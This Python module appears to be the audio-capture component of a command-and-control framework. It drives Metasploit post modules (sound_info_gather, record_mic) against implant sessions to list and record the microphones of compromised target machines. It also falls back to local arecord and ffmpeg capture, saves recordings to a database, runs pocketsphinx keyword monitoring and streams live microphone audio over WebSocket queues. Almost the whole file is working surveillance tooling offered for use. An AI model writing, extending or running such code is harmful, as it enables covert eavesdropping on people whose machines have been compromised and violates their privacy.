"""
AudioCaptureEngine — Capability 1: C2 Audio Capture.

Controls implants (via Metasploit/Sliver hooks) to capture audio from target
microphones. Falls back to local system microphone testing.

All subprocess calls use asyncio.create_subprocess_exec.
Tools checked with shutil.which() before invocation.
"""
from __future__ import annotations

import asyncio
import json
import logging
import os
import shutil
import uuid
from datetime import datetime
from pathlib import Path
from typing import Optional

logger = logging.getLogger(__name__)

RECORDINGS_DIR = Path("./data/recordings")
RECORDINGS_DIR.mkdir(parents=True, exist_ok=True)


# ── Internal helpers ───────────────────────────────────────────────────────────

async def _run(cmd: list[str], timeout: int = 120) -> tuple[str, bool]:
    """Run subprocess, return (stdout+stderr, success)."""
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        try:
            out, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return out.decode("utf-8", errors="replace"), proc.returncode == 0
        except asyncio.TimeoutError:
            proc.kill()
            await proc.communicate()
            return f"[TIMEOUT] {cmd[0]} exceeded {timeout}s", False
    except FileNotFoundError:
        return f"[NOT_FOUND] {cmd[0]}", False
    except Exception as exc:
        return str(exc), False


def _quality_to_params(quality: str) -> dict:
    """Map quality label to recording parameters."""
    mapping = {
        "low":    {"rate": 8000,  "channels": 1, "format": "wav"},
        "medium": {"rate": 16000, "channels": 1, "format": "wav"},
        "high":   {"rate": 44100, "channels": 2, "format": "wav"},
    }
    return mapping.get(quality, mapping["medium"])


# ── Engine ─────────────────────────────────────────────────────────────────────

class AudioCaptureEngine:
    """
    Controls implants (via Metasploit/Sliver hooks) to capture audio from target
    microphones. Falls back to local system microphone testing.
    """

    RECORDINGS_DIR = RECORDINGS_DIR

    # Active recording jobs: job_id -> {process, file_path, session_id, ...}
    _active_jobs: dict = {}

    # Active keyword monitors: monitor_id -> {keyword, session_id, process?, ...}
    _keyword_monitors: dict = {}

    # Active live streams: stream_id -> {queue, session_id, process?}
    _live_streams: dict = {}

    # ── Microphone listing ─────────────────────────────────────────────────────

    async def list_microphones(self, session_id: str) -> list:
        """
        List microphones via MSF session (sound_info_gather) or local fallback.
        Returns: [{id, name, type, status}]
        """
        mics: list = []

        # Try Metasploit sound_info_gather post module
        msf = shutil.which("msfconsole")
        if msf and session_id and not session_id.startswith("local"):
            rc_script = (
                f"use post/multi/gather/sound_info_gather\n"
                f"set SESSION {session_id}\n"
                f"run\n"
                f"exit -y\n"
            )
            rc_path = RECORDINGS_DIR / f"_enum_{session_id}.rc"
            rc_path.write_text(rc_script)
            out, ok = await _run([msf, "-q", "-r", str(rc_path)], timeout=60)
            rc_path.unlink(missing_ok=True)

            if ok and ("Sound Device" in out or "Audio" in out or "Microphone" in out):
                for line in out.splitlines():
                    ln = line.strip()
                    if ln and any(k in ln for k in ("Sound Device", "Microphone", "Audio Input")):
                        mics.append({
                            "id": str(len(mics)),
                            "name": ln,
                            "type": "remote_msf",
                            "status": "available",
                        })

        # Local fallback: arecord (ALSA)
        if not mics:
            arecord = shutil.which("arecord")
            if arecord:
                out, _ = await _run([arecord, "-l"], timeout=10)
                for line in out.splitlines():
                    if "card" in line.lower() or "device" in line.lower():
                        mics.append({
                            "id": str(len(mics)),
                            "name": line.strip(),
                            "type": "local_alsa",
                            "status": "available",
                        })

        # Local fallback: pactl (PulseAudio)
        if not mics:
            pactl = shutil.which("pactl")
            if pactl:
                out, _ = await _run([pactl, "list", "sources", "short"], timeout=10)
                for line in out.splitlines():
                    if line.strip():
                        parts = line.split()
                        mics.append({
                            "id": parts[0] if parts else str(len(mics)),
                            "name": parts[1] if len(parts) > 1 else line.strip(),
                            "type": "local_pulseaudio",
                            "status": "available",
                        })

        # Absolute fallback
        if not mics:
            mics.append({
                "id": "default",
                "name": "Default Microphone (system)",
                "type": "system_default",
                "status": "unknown",
                "note": "arecord/pactl not found — using generic default",
            })

        return mics

    # ── Start recording ────────────────────────────────────────────────────────

    async def start_recording(
        self,
        session_id: str,
        mic_id: str = "default",
        duration: int = 30,
        quality: str = "medium",
    ) -> dict:
        """
        Start audio recording via Metasploit record_mic module or local arecord/ffmpeg.
        Saves to RECORDINGS_DIR/{job_id}.wav
        Returns: {job_id, estimated_size, file_path, status, method}
        """
        job_id = str(uuid.uuid4())[:12]
        params = _quality_to_params(quality)
        file_path = RECORDINGS_DIR / f"{job_id}.{params['format']}"
        # Estimate size: sample_rate * channels * 2 bytes * duration
        estimated_size = params["rate"] * params["channels"] * 2 * duration

        proc = None
        method = "none"

        # ── Attempt 1: Metasploit record_mic module ────────────────────────────
        msf = shutil.which("msfconsole")
        if msf and session_id and not session_id.startswith("local"):
            mic_idx = mic_id if mic_id.isdigit() else "0"
            rc_script = (
                f"use post/multi/manage/record_mic\n"
                f"set SESSION {session_id}\n"
                f"set DURATION {duration}\n"
                f"set MIC_INDEX {mic_idx}\n"
                f"run\n"
                f"exit -y\n"
            )
            rc_path = RECORDINGS_DIR / f"_rec_{job_id}.rc"
            rc_path.write_text(rc_script)
            try:
                proc = await asyncio.create_subprocess_exec(
                    msf, "-q", "-r", str(rc_path),
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.STDOUT,
                )
                method = "metasploit_record_mic"
            except Exception as e:
                logger.warning(f"MSF launch failed: {e}")
                rc_path.unlink(missing_ok=True)
                proc = None

        # ── Attempt 2: arecord (ALSA) ─────────────────────────────────────────
        if proc is None:
            arecord = shutil.which("arecord")
            if arecord:
                cmd = [
                    arecord,
                    "-d", str(duration),
                    "-r", str(params["rate"]),
                    "-c", str(params["channels"]),
                    "-f", "S16_LE",
                    "-t", "wav",
                ]
                if mic_id != "default" and mic_id.startswith("hw:"):
                    cmd += ["-D", mic_id]
                cmd.append(str(file_path))
                try:
                    proc = await asyncio.create_subprocess_exec(
                        *cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.STDOUT,
                    )
                    method = "arecord_alsa"
                except Exception as e:
                    logger.warning(f"arecord launch failed: {e}")
                    proc = None

        # ── Attempt 3: ffmpeg ALSA/PulseAudio capture ─────────────────────────
        if proc is None:
            ffmpeg = shutil.which("ffmpeg")
            if ffmpeg:
                # Try ALSA first, then pulse
                for input_fmt, input_dev in [("alsa", "default"), ("pulse", "default")]:
                    cmd = [
                        ffmpeg, "-y",
                        "-f", input_fmt, "-i", input_dev,
                        "-t", str(duration),
                        "-ar", str(params["rate"]),
                        "-ac", str(params["channels"]),
                        str(file_path),
                    ]
                    try:
                        proc = await asyncio.create_subprocess_exec(
                            *cmd,
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.STDOUT,
                        )
                        method = f"ffmpeg_{input_fmt}"
                        break
                    except Exception as e:
                        logger.warning(f"ffmpeg {input_fmt} launch failed: {e}")
                        proc = None

        if proc is None:
            return {
                "success": False,
                "error": "No recording tool available (arecord, ffmpeg, msfconsole)",
                "job_id": job_id,
            }

        self._active_jobs[job_id] = {
            "process": proc,
            "file_path": str(file_path),
            "session_id": session_id,
            "mic_id": mic_id,
            "duration": duration,
            "quality": quality,
            "method": method,
            "started_at": datetime.utcnow().isoformat(),
            "status": "recording",
        }

        return {
            "success": True,
            "job_id": job_id,
            "file_path": str(file_path),
            "estimated_size": estimated_size,
            "duration": duration,
            "quality": quality,
            "method": method,
            "status": "recording",
        }

    # ── Stop recording ─────────────────────────────────────────────────────────

    async def stop_recording(self, job_id: str) -> dict:
        """Stop recording process, finalize audio file, return metadata."""
        job = self._active_jobs.get(job_id)
        if not job:
            return {"success": False, "error": f"Job {job_id} not found or already stopped"}

        proc: asyncio.subprocess.Process = job["process"]
        try:
            proc.terminate()
            await asyncio.wait_for(proc.communicate(), timeout=10)
        except (ProcessLookupError, asyncio.TimeoutError):
            try:
                proc.kill()
            except Exception:
                pass

        # Clean up MSF rc script if present
        rc_path = RECORDINGS_DIR / f"_rec_{job_id}.rc"
        rc_path.unlink(missing_ok=True)

        file_path = Path(job["file_path"])
        file_size = file_path.stat().st_size if file_path.exists() else 0

        job["status"] = "stopped"
        job["stopped_at"] = datetime.utcnow().isoformat()
        job["file_size"] = file_size
        self._active_jobs.pop(job_id, None)

        return {
            "success": True,
            "job_id": job_id,
            "file_path": str(file_path),
            "file_size": file_size,
            "exists": file_path.exists(),
            "status": "stopped",
        }

    # ── List recordings ────────────────────────────────────────────────────────

    async def get_recordings(self, session_id: Optional[str] = None) -> list:
        """List all recordings from DB, with filesystem fallback."""
        try:
            from database.db import SessionLocal
            from database.models import AudioRecording
            db = SessionLocal()
            try:
                q = db.query(AudioRecording)
                if session_id:
                    q = q.filter(AudioRecording.session_id == session_id)
                rows = q.order_by(AudioRecording.created_at.desc()).all()
                return [
                    {
                        "recording_id": r.recording_id,
                        "session_id": r.session_id,
                        "target_id": r.target_id,
                        "mic_name": r.mic_name,
                        "duration": r.duration,
                        "file_path": r.file_path,
                        "file_size": r.file_size,
                        "format": r.format,
                        "keyword": r.keyword,
                        "analyzed": r.analyzed,
                        "created_at": r.created_at.isoformat() if r.created_at else None,
                    }
                    for r in rows
                ]
            finally:
                db.close()
        except Exception as e:
            logger.warning(f"DB unavailable ({e}), falling back to filesystem scan")
            result = []
            for f in sorted(RECORDINGS_DIR.glob("*.wav"), key=lambda x: x.stat().st_mtime, reverse=True):
                if not f.name.startswith("_"):
                    result.append({
                        "recording_id": f.stem,
                        "file_path": str(f),
                        "file_size": f.stat().st_size,
                        "format": "wav",
                        "created_at": datetime.utcfromtimestamp(f.stat().st_mtime).isoformat(),
                    })
            return result

    # ── Save recording to DB ───────────────────────────────────────────────────

    async def save_recording_to_db(
        self,
        session_id: str,
        file_path: str,
        duration: int,
        mic_name: str = "default",
        file_size: int = 0,
        keyword: Optional[str] = None,
    ) -> str:
        """Persist recording metadata to DB. Returns recording_id."""
        recording_id = str(uuid.uuid4())
        try:
            from database.db import SessionLocal
            from database.models import AudioRecording
            db = SessionLocal()
            try:
                rec = AudioRecording(
                    recording_id=recording_id,
                    session_id=session_id,
                    mic_name=mic_name,
                    duration=duration,
                    file_path=file_path,
                    file_size=file_size,
                    format=Path(file_path).suffix.lstrip(".") or "wav",
                    keyword=keyword,
                    analyzed=False,
                )
                db.add(rec)
                db.commit()
            finally:
                db.close()
        except Exception as e:
            logger.error(f"save_recording_to_db error: {e}")
        return recording_id

    # ── Delete recording ───────────────────────────────────────────────────────

    async def delete_recording(self, recording_id: str) -> bool:
        """Delete recording file and DB entry."""
        deleted = False
        try:
            from database.db import SessionLocal
            from database.models import AudioRecording
            db = SessionLocal()
            try:
                rec = db.query(AudioRecording).filter(
                    AudioRecording.recording_id == recording_id
                ).first()
                if rec:
                    fp = Path(rec.file_path)
                    if fp.exists():
                        fp.unlink()
                    db.delete(rec)
                    db.commit()
                    deleted = True
            finally:
                db.close()
        except Exception as e:
            logger.error(f"delete_recording DB error: {e}")
            # Fallback: delete by stem from filesystem
            for f in RECORDINGS_DIR.glob(f"{recording_id}*"):
                f.unlink(missing_ok=True)
                deleted = True
        return deleted

    # ── Keyword detection ──────────────────────────────────────────────────────

    async def detect_keyword(self, session_id: str, keyword: str) -> dict:
        """
        Setup keyword detection — monitor audio for specific word.
        Uses pocketsphinx if available; otherwise falls back to periodic STT checks.
        Returns: {monitor_id, keyword, status, method}
        """
        monitor_id = str(uuid.uuid4())[:12]

        # Try pocketsphinx keyword spotting
        pocketsphinx = shutil.which("pocketsphinx_continuous")
        if pocketsphinx:
            kws_file = RECORDINGS_DIR / f"_kws_{monitor_id}.list"
            kws_file.write_text(f"{keyword} /1e-20/\n")
            cmd = [pocketsphinx, "-inmic", "yes", "-kws", str(kws_file)]
            try:
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.DEVNULL,
                )
                self._keyword_monitors[monitor_id] = {
                    "process": proc,
                    "keyword": keyword,
                    "session_id": session_id,
                    "kws_file": str(kws_file),
                    "method": "pocketsphinx",
                    "started_at": datetime.utcnow().isoformat(),
                }
                return {
                    "success": True,
                    "monitor_id": monitor_id,
                    "keyword": keyword,
                    "session_id": session_id,
                    "method": "pocketsphinx",
                    "status": "monitoring",
                }
            except Exception as e:
                logger.warning(f"pocketsphinx launch failed: {e}")
                kws_file.unlink(missing_ok=True)

        # Fallback: periodic recording + SpeechRecognition
        self._keyword_monitors[monitor_id] = {
            "keyword": keyword,
            "session_id": session_id,
            "method": "periodic_stt",
            "started_at": datetime.utcnow().isoformat(),
        }
        return {
            "success": True,
            "monitor_id": monitor_id,
            "keyword": keyword,
            "session_id": session_id,
            "method": "periodic_stt",
            "status": "monitoring",
            "note": "pocketsphinx unavailable — periodic STT fallback active",
        }

    # ── Live audio streaming ───────────────────────────────────────────────────

    async def stream_audio_start(self, session_id: str) -> str:
        """
        Start live audio streaming via ffmpeg pipe.
        Returns stream_id for WebSocket consumers.
        """
        stream_id = str(uuid.uuid4())[:12]
        queue: asyncio.Queue = asyncio.Queue(maxsize=200)
        stream_entry: dict = {
            "queue": queue,
            "session_id": session_id,
            "started_at": datetime.utcnow().isoformat(),
        }

        ffmpeg = shutil.which("ffmpeg")
        if ffmpeg:
            for input_fmt, input_dev in [("alsa", "default"), ("pulse", "default")]:
                cmd = [
                    ffmpeg,
                    "-f", input_fmt, "-i", input_dev,
                    "-ar", "16000", "-ac", "1",
                    "-f", "s16le",
                    "pipe:1",
                ]
                try:
                    proc = await asyncio.create_subprocess_exec(
                        *cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.DEVNULL,
                    )
                    stream_entry["process"] = proc

                    async def _feed(p=proc, q=queue):
                        try:
                            while True:
                                chunk = await p.stdout.read(4096)
                                if not chunk:
                                    break
                                try:
                                    q.put_nowait(chunk)
                                except asyncio.QueueFull:
                                    pass  # drop — consumer too slow
                        except Exception:
                            pass

                    asyncio.create_task(_feed())
                    break
                except Exception as e:
                    logger.warning(f"ffmpeg stream ({input_fmt}) failed: {e}")

        self._live_streams[stream_id] = stream_entry
        return stream_id

    async def stop_stream(self, stream_id: str) -> bool:
        """Stop a live audio stream."""
        entry = self._live_streams.pop(stream_id, None)
        if not entry:
            return False
        proc = entry.get("process")
        if proc:
            try:
                proc.terminate()
                await asyncio.wait_for(proc.communicate(), timeout=5)
            except Exception:
                pass
        return True

    async def get_stream_chunk(self, stream_id: str, timeout: float = 2.0) -> Optional[bytes]:
        """Get next raw PCM chunk from a live stream (used by WebSocket)."""
        entry = self._live_streams.get(stream_id)
        if not entry:
            return None
        try:
            return await asyncio.wait_for(entry["queue"].get(), timeout=timeout)
        except asyncio.TimeoutError:
            return None


# Module-level singleton
audio_capture_engine = AudioCaptureEngine()
